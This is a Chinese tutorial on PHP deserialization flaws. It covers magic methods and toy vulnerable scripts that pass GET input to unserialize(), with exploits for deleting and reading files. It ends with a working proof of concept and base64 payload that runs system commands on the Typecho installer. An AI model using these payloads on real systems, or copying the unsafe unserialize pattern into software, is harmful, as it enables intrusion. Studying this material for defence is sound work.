# PHP反序列化漏洞

## 什么是序列化和反序列化

序列化：将对象转换成一个字符串，PHP序列化函数是:`serialize()`
反序列化：将序列化后的字符串还原为一个对象，PHP反序列化函数是:`unserialize()`

序列化反序列化示例：

```php
// 创建类
<?php
class zhangsan{

    public $sex = '男';

    public $age = '50';

    public function skill(){
        echo "没病走两步";
    }
}

// 序列化和反序列化
$belles =  new zhangsan();
echo serialize($belles);
echo "\n\r";
unserialize('O:8:"zhangsan":2:{s:3:"sex";s:3:"男";s:3:"age";s:2:"50";}');
// 看看它的年龄
echo $belles->age;
```

## 与PHP反序列化有关的魔法函数

```php
__destruct()    //对象被销毁时触发
__construct()   //当一个对象创建时被调用
__wakeup()      //使用unserialize时触发
__sleep()       //使用serialize时触发
__toString()    //把类当作字符串使用时触发
__get()         //获取不存在的类属性时触发
__set()         //设置不存在的类属性会触发
__isset()       //在不可访问的属性上调用isset()或empty()触发
__unset()       //在不可访问的属性上使用unset()时触发
__invoke()      //当脚本尝试将对象调用为函数时触发
```

魔术方法的触发条件：

- 对象在创建的时候调用了__construct方法，在销毁的时候调用了__destruct方法

```php
<?php
class Pers
{
    public $age = '18';
    public function __construct(){
        echo '创建对象触发'."\n\r";
    }
    public function __destruct(){
        echo '销毁对象触发';
    }
}

$per = new Pers();  // 创建对象，触发__construct魔术方法
unset($per);        // 销毁对象，触发__destruct魔术方法
```

- 对象在实例化的时候触发了__sleep方法，在反序列化的时候触发了__wakeup方法

```php
<?php
class Pers
{
    public $age = '18';
    public function __sleep(){
        echo '使用serialize时触发'."\n\r";
        return(array('age'));
    }
    public function __wakeup(){
        echo '使用unserialize时触发';
    }
}

$per = new Pers();
serialize($per);        // 序列化，触发__sleep魔术方法
unserialize('O:4:"Pers":1:{s:3:"age";s:2:"18";}'); // 反序列化，触发__wakeup魔术方法
```

- 对象在`echo`的时候会把对象当成字符串就会触发`__toString`方法，获取类不存在的属性`p1`，触发`__get`魔术方法,设置类不存在的属性`n`，触发`__set`魔术方法

```php
<?php
class Pers
{
    public $age = '18';

    public function __toString(){
        return '对象当作字符串使用时触发'."\n\r";
    }
    public function __get($p){
        echo '获取类不存在的方法会触发'."\n\r";
    }
    public function __set($n,$v){
        echo "设置不存在的类属性会触发"."\n\r";
    }
}
$per = new Pers();
$per->age = '20';
echo $per;          // 把对象当成字符串输出
$per->p1;           // 获取类不存在的属性
$per->n = 'aa';     // 设置类不存在的属性
```

- 判断属性是否存在的时候触发`__isset`魔术方法,删除不存在的属性时候触发`__unset`魔术方法,把对象当作函数的时候触发`__invoke`魔术方法

```php
<?php
class Pers
{
    public $age = '18';

    public function __isset($p){
        echo "判断属性是否存在的时候触发"."\n\r";
    }
    public function __unset($content) {
        echo "当在类外部使用unset()函数来删不存在的属性时自动调用的"."\n\r";
    }
    public function __invoke($content) {
        echo "把一个对象当成一个函数去执行"."\n\r";
    }
}

$per = new Pers();
$per->age = '20';
isset($per->aaa);  // 判断属性是否存在
unset($per->ages);  // 删除不存在的属性
$per('111');        // 把对象当作函数
```

## php反序列化案例

### 小案例1

先修改值，然后序列化

```php
// demo1.php
<?php
class delete{
    public $name = 'error';
    function __destruct()
    {
        echo $this->name.'<br>';
        echo $this->name . ' delete';
        unlink(dirname(__FILE__).'/'.$this->name);
    }
}

// demo2.php
<?php
include 'demo1.php';
class per{
    public $name = '';
    public $age = '';
    public function infos(){
        echo '这里随便';
    }
}
$pers = unserialize($_GET['id']);
```

分析一下上面的代码，可以看到直接获取`id`,这个参数可控，我们可以把这个参数输入成delete类的实例化，并把delete类中的`$name`的参数进行修改成我们想要的，就可以造成文件删除，下面来构造一下Exploit：

```php
// 序列化 demo1.php
<?php
class delete{
    public $name = 'error';
}
$del = new delete();
$del->name = 'ccc.php';
echo serialize($del);

// demo2.php?id=O:6:"delete":1:{s:4:"name";s:7:"ccc.php";}
```

### 小案例2

```php
// demo3.php
<?php
class red{
    public $name = 'error';
    function __toString()
    {
        // echo $this->name;
        return file_get_contents($this->name);
    }
}

// demo4.php
<?php
include 'demo3.php';
class per{
    public $name = '';
    public $age = '';
    public function infos(){
        echo '这里随便';
    }
}
$pers = unserialize($_GET['id']);
echo $pers;
```

我们可以看到id参数同样可控的，red类有一个__toString方法，这个方法上面说到了，只要当成字符串使用就会自动调用，可以构造下面的Exploit，来查看文件内容

```php
// 序列化 demo1.php
<?php
class red{
    public $name = 'error';
}
$del = new red();
$del->name = 'ccc.txt';
echo serialize($del);
```

## Typecho安装文件反序列化漏洞POC


```php
<?php
class Typecho_Feed
{
    const RSS1 = 'RSS 1.0';
    const RSS2 = 'RSS 2.0';
    const ATOM1 = 'ATOM 1.0';
    const DATE_RFC822 = 'r';
    const DATE_W3CDTF = 'c';
    const EOL = "\n";
    private $_type;
    private $_items;

    public function __construct(){
        $this->_type = $this::RSS2;
        $this->_items[0] = array(
            'title' => '1',
            'link' => '1',
            'date' => 1508895132,
            'category' => array(new Typecho_Request()),
            'author' => new Typecho_Request(),
        );
    }
}

class Typecho_Request
{
    private $_params = array();
    private $_filter = array();

    public function __construct(){
        $this->_params['screenName'] = 'phpinfo()';
        $this->_filter[0] = 'assert';
    }
    // 执行系统命令
    // public function __construct(){
    //     $this->_params['screenName'] = 'ipconfig';
    //     $this->_filter[0] = 'system';
    // }
}

$exp = array(
    'adapter' => new Typecho_Feed(),
    'prefix' => 'typecho_'
);

echo base64_encode(serialize($exp));

// payload
__typecho_config=YToyOntzOjc6ImFkYXB0ZXIiO086MTI6IlR5cGVjaG9fRmVlZCI6Mjp7czoxOToiAFR5cGVjaG9fRmVlZABfdHlwZSI7czo3OiJSU1MgMi4wIjtzOjIwOiIAVHlwZWNob19GZWVkAF9pdGVtcyI7YToxOntpOjA7YTo1OntzOjU6InRpdGxlIjtzOjE6IjEiO3M6NDoibGluayI7czoxOiIxIjtzOjQ6ImRhdGUiO2k6MTUwODg5NTEzMjtzOjg6ImNhdGVnb3J5IjthOjE6e2k6MDtPOjE1OiJUeXBlY2hvX1JlcXVlc3QiOjI6e3M6MjQ6IgBUeXBlY2hvX1JlcXVlc3QAX3BhcmFtcyI7YToxOntzOjEwOiJzY3JlZW5OYW1lIjtzOjg6ImlwY29uZmlnIjt9czoyNDoiAFR5cGVjaG9fUmVxdWVzdABfZmlsdGVyIjthOjE6e2k6MDtzOjY6InN5c3RlbSI7fX19czo2OiJhdXRob3IiO086MTU6IlR5cGVjaG9fUmVxdWVzdCI6Mjp7czoyNDoiAFR5cGVjaG9fUmVxdWVzdABfcGFyYW1zIjthOjE6e3M6MTA6InNjcmVlbk5hbWUiO3M6ODoiaXBjb25maWciO31zOjI0OiIAVHlwZWNob19SZXF1ZXN0AF9maWx0ZXIiO2E6MTp7aTowO3M6Njoic3lzdGVtIjt9fX19fXM6NjoicHJlZml4IjtzOjg6InR5cGVjaG9fIjt9
```
